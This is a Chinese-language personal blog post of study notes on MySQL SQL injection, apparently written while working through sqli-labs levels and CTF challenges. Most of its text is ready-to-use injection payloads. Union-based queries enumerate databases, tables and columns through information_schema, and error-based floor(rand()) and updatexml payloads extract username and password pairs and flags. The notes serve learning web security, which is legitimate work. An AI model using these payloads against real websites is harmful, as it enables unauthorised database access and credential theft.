<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>sql注入 | zhiliya</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="函数1group_concat(DISTINCT column_name)    与group by配合使用，添加distinct后，将不同的column_name连接起来    接下来我们就要判断SQL语句的POC了。SQL常有三种POC： (1)….where user_id &#x3D; $id (2)….where user_id &#x3D; ‘$id’ (3)….where user_id &#x3D; “$id”">
<meta property="og:type" content="article">
<meta property="og:title" content="sql注入">
<meta property="og:url" content="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/index.html">
<meta property="og:site_name" content="zhiliya">
<meta property="og:description" content="函数1group_concat(DISTINCT column_name)    与group by配合使用，添加distinct后，将不同的column_name连接起来    接下来我们就要判断SQL语句的POC了。SQL常有三种POC： (1)….where user_id &#x3D; $id (2)….where user_id &#x3D; ‘$id’ (3)….where user_id &#x3D; “$id”">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/clip_image002.jpg">
<meta property="og:image" content="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200724162559075.png">
<meta property="og:image" content="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200725194906580.png">
<meta property="og:image" content="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200725194820898.png">
<meta property="og:image" content="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200725101536916.png">
<meta property="og:image" content="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928204840594-1429421338.png">
<meta property="og:image" content="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205421297-407989251.png">
<meta property="og:image" content="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205451969-1920882857.png">
<meta property="og:image" content="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205719485-521701933.png">
<meta property="og:image" content="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205942266-563740245.png">
<meta property="og:image" content="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928205828281-760176387.png">
<meta property="og:image" content="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928210038094-1420034123.png">
<meta property="og:image" content="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928210144438-1099086559.png">
<meta property="og:image" content="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928210420750-344279412.png">
<meta property="og:image" content="http://images2015.cnblogs.com/blog/1016026/201609/1016026-20160928210533313-2028104812.png">
<meta property="og:image" content="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/clip_image002-1595815350664.jpg">
<meta property="og:image" content="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200724162612769.png">
<meta property="og:image" content="https://bkimg.cdn.bcebos.com/pic/e850352ac65c103880a07b53bc119313b17e8941?x-bce-process=image/watermark,image_d2F0ZXIvYmFpa2UxMTY=,g_7,xp_5,yp_5">
<meta property="og:image" content="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200726094605905.png">
<meta property="og:image" content="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200726094636368.png">
<meta property="og:image" content="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200726094827654.png">
<meta property="og:image" content="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/C:%5CUsers%5C60120%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200717185407999.png">
<meta property="og:image" content="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/C:%5CUsers%5C60120%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200717185506805.png">
<meta property="og:image" content="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200724162700969.png">
<meta property="og:image" content="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/20190606135816-14265b86-8820-1.jpeg.png">
<meta property="og:image" content="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200725200836410.png">
<meta property="og:image" content="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/20190606135745-0118966c-8820-1.jpeg.png">
<meta property="og:image" content="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200724162742818.png">
<meta property="og:image" content="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200725221517562.png">
<meta property="og:image" content="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200725221606747.png">
<meta property="og:image" content="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200724162734076.png">
<meta property="og:image" content="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200726093411245.png">
<meta property="og:image" content="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200726093636222.png">
<meta property="og:image" content="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200724162715417.png">
<meta property="og:image" content="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200724162721889.png">
<meta property="article:published_time" content="2019-11-24T03:30:11.000Z">
<meta property="article:modified_time" content="2020-09-26T03:31:07.733Z">
<meta property="article:author" content="zhiliya">
<meta property="article:tag" content="sql注入">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/clip_image002.jpg">
  
    <link rel="alternate" href="/atom.xml" title="zhiliya" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">zhiliya</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">欢迎访问我的博客</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-1 sql注入" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/" class="article-date">
  <time datetime="2019-11-24T03:30:11.000Z" itemprop="datePublished">2019-11-24</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      sql注入
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat(DISTINCT column_name)    与group by配合使用，添加distinct后，将不同的column_name连接起来</span><br></pre></td></tr></table></figure>



<p>接下来我们就要判断SQL语句的POC了。SQL常有三种POC：<br> (1)….where user_id = $id</p>
<p>(2)….where user_id = ‘$id’</p>
<p>(3)….where user_id = “$id” </p>
<p>抓到数据包后依然是先尝试确定 POC。首先将 id 的参数改为 <code>1 or 12=12</code> 发现数据包发送成功了，返回了多个值，说明数据库的 POC 为第一种。</p>
<p>我们尝试下 <code>1&#39; or &#39;12&#39;=&#39;12</code>，响应包显示失败。<code>1&quot; or &quot;12&quot;=&quot;12</code> 同理也是失败。 </p>
<p>1‘ #</p>
<p>’呢？那就会报错了。 报错mysql_query () 函数就会返回一个布尔值</p>
<p>因为 mysql_query () 函数会返回一个布尔值，在下行代码中 mysql_fetch_array ($sql) 将执行失败，并且 PHP 会显示一条警告信息，告诉我们 mysql_fetch_array () 的第一个参数必须是个资源，而代码在实际运行中，给出的参数值却是一个布尔值。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> <span class="keyword">test</span>;   //创建test数据库</span><br><span class="line"><span class="keyword">use</span> <span class="keyword">test</span>;    </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">user</span>(username <span class="built_in">varchar</span>(<span class="number">8</span>), <span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">32</span>));  //创建user表</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">user</span>(username, <span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'test'</span>,<span class="string">'123456'</span>);  //插入数据</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">'cat'</span>=<span class="string">''</span> <span class="keyword">and</span> passwd = <span class="string">'cat'</span>=<span class="string">''</span>;  可成功执行</span><br></pre></td></tr></table></figure>

<img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/clip_image002.jpg" alt="img" style="zoom:150%;">



<h2 id="有回显和位-union联合注入"><a href="#有回显和位-union联合注入" class="headerlink" title="有回显和位 union联合注入"></a>有回显和位 union联合注入</h2><p>类似于</p>
<p>$sql=”SELECT * FROM users WHERE id=($id) LIMIT 0,1”;<br>$result=mysql_query($sql);<br>$row = mysql_fetch_array($result);</p>
<p>echo ‘Your Login name:’. $row[‘username’];</p>
<h4 id="获取字段显示位"><a href="#获取字段显示位" class="headerlink" title="获取字段显示位"></a><strong>获取字段显示位</strong></h4><p>在页面上会显示从 select 语句中选取的字段，通过以上方式 2 中的 <strong><em>union select 1,2,3…</em></strong> 可判断出具体显示字段的显示位</p>
<h4 id="通过显示位获取数据库信息"><a href="#通过显示位获取数据库信息" class="headerlink" title="通过显示位获取数据库信息"></a>通过显示位获取数据库信息</h4><p>1’ union select version(),@@version_compile_os #</p>
<p>1’ union select user(),database()#</p>
<p>1’ union all select user(),database()#</p>
<p>mysql：<br> \1. 判断版本 and ord (mid (version (),1,1))&gt;51 /* 返回正常说明是 4.0 以上版本，可以用 union 查询 </p>
<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200724162559075.png" alt="image-20200724162559075"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">猜测是</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'$id'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>select * from users where id=’<strong>1’–+</strong> limit 0,1</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">三种注释方式：</span><br><span class="line">1' or 1=1 <span class="comment">#</span></span><br><span class="line">1' or 1=1 <span class="comment">-- (末尾为空格)                 --+不就是--空格</span></span><br><span class="line">1' or 'abc'='abc</span><br></pre></td></tr></table></figure>

<p>列怎么来判断呢  用order by</p>
<p>select * from users where id=’<strong>1’ order by 3–+</strong> limit 0,1</p>
<p>select * from users where id=’<strong>1’ order by 4–+</strong> limit 0,1   到4就回显没有列4</p>
<p>or</p>
<p>select * from users where id=’<strong>-1’ union select 1,2 –+</strong> limit 0,1 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">union语句只能返回一条查询结果 前面必须构造为查询结果不存在 才能显示我们想要获取到的信息的那条</span><br><span class="line">获取数据库名</span><br><span class="line">select * from users where id&#x3D;&#39;</span><br><span class="line">-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata  --+ </span><br><span class="line">limit 0,1 </span><br><span class="line">数据库名security</span><br></pre></td></tr></table></figure>

<h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><p>select * from users where id=’<strong>-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() –+</strong> limit 0,1 </p>
<p>or</p>
<p>select * from users where id=’<strong>-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=”security” –+</strong> limit 0,1 </p>
<h4 id="爆列-字段名"><a href="#爆列-字段名" class="headerlink" title="爆列(字段名)"></a>爆列(字段名)</h4><p>id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’–+  </p>
<p>admin’union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’b4bsql’#</p>
<h4 id="爆字段值"><a href="#爆字段值" class="headerlink" title="爆字段值"></a>爆字段值</h4><p>?id=-1’ union select 1,group_concat(concat_ws(‘:’,username,password)),3 from security.users–+</p>
<p>1’ union select 1,group_concat(concat_ws(‘–’,username,password)) from users #<br>1’ union select 1,group_concat(concat_ws(0x7c,username,password)) from users #</p>
<h2 id="无回显位-盲注"><a href="#无回显位-盲注" class="headerlink" title="无回显位 盲注"></a>无回显位 盲注</h2><h3 id="报错盲注"><a href="#报错盲注" class="headerlink" title="报错盲注"></a>报错盲注</h3><p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200725194906580.png" alt="image-20200725194906580"></p>
<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200725194820898.png" alt="image-20200725194820898"></p>
<h4 id="floor-round-报错"><a href="#floor-round-报错" class="headerlink" title="floor(round)报错"></a>floor(round)报错</h4><p>  <code>floor(rand(0)*2)</code> 报错是有条件的，记录必须 3 条以上，而且在 3 条以上必定报错 </p>
<p> 一条记录的话 无论执行多少次也不报错。然后增加一条记录，两条记录的话 结果就变成不确定性了。 </p>
<p>原理方面可以看这篇文章：<a href="https://www.cnblogs.com/litlife/p/8472323.html" target="_blank" rel="noopener">https://www.cnblogs.com/litlife/p/8472323.html</a></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*), <span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*), <span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">database</span>()), <span class="string">'-'</span>, <span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a; </span><br><span class="line"><span class="comment">#将select database()换成你想要的东西</span></span><br><span class="line">&amp;username=test%00' and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),<span class="keyword">database</span>())x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x )a) ;%23</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">报错盲注</span><br><span class="line">            <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*), <span class="keyword">concat</span>(<span class="string">'~'</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="string">'~'</span>, <span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a)x;</span><br><span class="line">?id=2' and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*), <span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata),<span class="keyword">floor</span> (<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">as</span> x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x) <span class="keyword">as</span> a) <span class="comment">--+   提示输出信息超过一行，说明这里数据库名组成的字符串长度超过了64位(group_concat()函数最大长度为64位)，所以需要放弃group_concat()函数，而使用limit 0,1来一个个输出。</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">2</span><span class="string">' and (select 1 from (select count(*),concat((select schema_name             from information_schema.schemata limit 0,1),floor (rand()*2)) as x from information_schema.tables group by x) as a) --+ 为了方便查看，稍微改动语句</span></span><br><span class="line"><span class="string">?id=2'</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">concat</span>(schema_name,<span class="string">';'</span>) <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="keyword">floor</span> (<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">as</span> x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x) <span class="keyword">as</span> a)<span class="comment">--+   继续爆其他数据库名，改变limit n,1即可</span></span><br><span class="line">?id=2' and (select 1 from (select count(*),concat((select concat(schema_name,';') from information_schema.schemata limit 1,1),floor(rand()*2)) as x from information_schema.tables group by x) as a) --+</span><br><span class="line">爆security数据库中的表：</span><br><span class="line">?id=2' and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">concat</span>(table_name,<span class="string">';'</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">as</span> x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x) <span class="keyword">as</span> a) <span class="comment">--+ 还是更换limit n,1一个一个爆出。</span></span><br><span class="line">爆<span class="keyword">users</span>表的列名：</span><br><span class="line">?id=2' and (select 1 from (select count(*),concat((select concat(column_name,';') from information_schema.columns where table_name='users' limit 0,1),floor(rand()*2)) as x from information_schema.columns group by x) as a) --+</span><br><span class="line">爆users表中的内容:</span><br><span class="line">用户名和密码为，同样，limit n,1慢慢来吧：</span><br><span class="line">?id=2' and(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">concat</span>(username,<span class="string">': '</span>,<span class="keyword">password</span>,<span class="string">';'</span>) <span class="keyword">from</span> security.users <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">as</span> x <span class="keyword">from</span> security.users <span class="keyword">group</span> <span class="keyword">by</span> x) <span class="keyword">as</span> a)<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">现在我们准备加上<span class="keyword">Group</span> <span class="keyword">By</span> 语句了。</span><br><span class="line">我们使用information_schema.tables 或 information_schema.columns者两个表来查询。因为表里面一般数据很多。容易生成很多的随机值，不至于全部是security0，这样就不能查询出结果了。</span><br><span class="line">https://blog.csdn.net/Leep0rt/article/details/<span class="number">78556440</span></span><br><span class="line">双查询注入</span><br><span class="line">在此之前，我们理解一下子查询，查询的关键字是<span class="keyword">select</span>，这个大家都知道。子查询可以简单的理解在一个<span class="keyword">select</span>语句里还有一个<span class="keyword">select</span>。里面的这个<span class="keyword">select</span>语句就是子查询。</span><br><span class="line">看一个简单的例子：</span><br><span class="line"><span class="keyword">Select</span> <span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">database</span>()));</span><br><span class="line">真正执行的时候，先从子查询进行。因此执行<span class="keyword">select</span> <span class="keyword">database</span>() 这个语句就会把当前的数据库查出来，然后把结果传入到<span class="keyword">concat</span>函数。这个函数是用来连接的。比如 <span class="keyword">concat</span>(‘a’,’b’)那结果就是ab了。</span><br><span class="line"></span><br><span class="line"><span class="keyword">Less</span><span class="number">-05</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' and (select 1 from(select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) as a from information_schema.columns group by a)as b)--+数据库名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1'</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a)b)<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' and (select 1 from (select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 2,1),0x3a,0x3a,floor(rand(0)*2))as a from information_schema.columns group by a)b)--+</span></span><br><span class="line"><span class="string">------------------------------------------------------------------------------爆表名</span></span><br><span class="line"><span class="string">?id=1'</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'emails'</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a)b)<span class="comment">--+</span></span><br><span class="line"><span class="comment">------------------------------------------------------------------------------爆列名</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' and (select 1 from (select count(*),concat(0x3a,0x3a,(select email_id from security.emails limit 2,1),0x3a,0x3a,floor(rand(0)*2))as a from information_schema.columns group by a)b)--+</span></span><br><span class="line"><span class="string">------------------------------------------------------------------------------爆字段值</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200725101536916.png" alt></p>
<h4 id="updatexml报错"><a href="#updatexml报错" class="headerlink" title="updatexml报错"></a>updatexml报错</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Less-06</span><br><span class="line">?id=1" and updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--+  </span></span><br><span class="line">爆数据库名 <span class="keyword">or</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">" and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1),0x7e),1)--+ </span></span><br><span class="line"><span class="string">爆数据库名  security</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1"</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--+  爆表名  users</span></span><br><span class="line"></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">" and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 5,1),0x7e),1)--+  爆列名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1"</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> username <span class="keyword">from</span> security.users <span class="keyword">limit</span> <span class="number">7</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">sql</span>注入进阶<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`sql</span></span><br><span class="line"><span class="string">-1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),0) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='flag')),0) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-1' and updatexml(1,concat(0x7e,(select group_concat(flag) from flag)),0) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-1' and updatexml(1,concat(0x7e,right((select group_concat(flag) from flag),20)),0) #</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span></span><br></pre></td></tr></table></figure>

<p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，<br>文中为Doc 1<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解<br>Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的<br>数据<br>作用：改变文档中符合条件的节点的值</p>
